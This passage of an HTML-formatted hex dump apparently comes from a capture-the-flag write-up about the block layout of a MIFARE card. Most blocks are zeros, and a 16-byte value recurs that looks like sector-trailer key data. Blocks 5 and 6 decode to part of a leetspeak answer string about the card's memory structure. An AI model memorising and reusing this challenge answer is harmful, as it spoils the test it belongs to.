class="hljs-number">6</span>e <span class="hljs-number">67</span> <span class="hljs-number">5</span>f <span class="hljs-number">73</span> <span class="hljs-number">37</span> <span class="hljs-number">72</span> <span class="hljs-number">75</span> <span class="hljs-number">63</span> <span class="hljs-number">37</span> <span class="hljs-number">75</span> <span class="hljs-number">72</span> <span class="hljs-number">33</span> <span class="hljs-number">5</span>f <span class="hljs-number">30</span> <span class="hljs-number">66</span> <span class="hljs-number">5</span>f <br><span class="hljs-attribute">Block</span> <span class="hljs-number">6</span>: <span class="hljs-number">6</span>d <span class="hljs-number">31</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">72</span> <span class="hljs-number">33</span> <span class="hljs-number">5</span>f <span class="hljs-number">63</span> <span class="hljs-number">61</span> <span class="hljs-number">72</span> <span class="hljs-number">64</span> <span class="hljs-number">5</span>f <span class="hljs-number">70</span> <span class="hljs-number">58</span> <span class="hljs-number">4</span>c <span class="hljs-number">46</span> <br><span class="hljs-attribute">Block</span> <span class="hljs-number">7</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">8</span>: <span class="hljs-number">4</span>f <span class="hljs-number">74</span> <span class="hljs-number">46</span> <span class="hljs-number">4</span>a <span class="hljs-number">75</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>b <span class="hljs-number">43</span> <span class="hljs-number">6</span>b <span class="hljs-number">62</span> <span class="hljs-number">50</span> <span class="hljs-number">68</span> <span class="hljs-number">4</span>e <span class="hljs-number">50</span> <span class="hljs-number">7</span>a <span class="hljs-number">56</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">9</span>: FE <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">10</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">11</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">12</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">13</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">14</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">15</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">16</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">17</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">18</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">19</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">20</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">21</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">22</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">23</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">24</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">25</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">26</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">27</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">28</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">29</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">30</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">31</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">32</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">33</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">34</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">35</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">36</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">37</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">38</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">39</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">40</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">41</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">42</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">43</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">44</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">45</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">46</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">47</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">48</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">49</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">50</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">51</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">52</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">53</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">54</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">55</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">56</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">57</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">58</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">59</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">60</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">61</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">62</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">63</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span 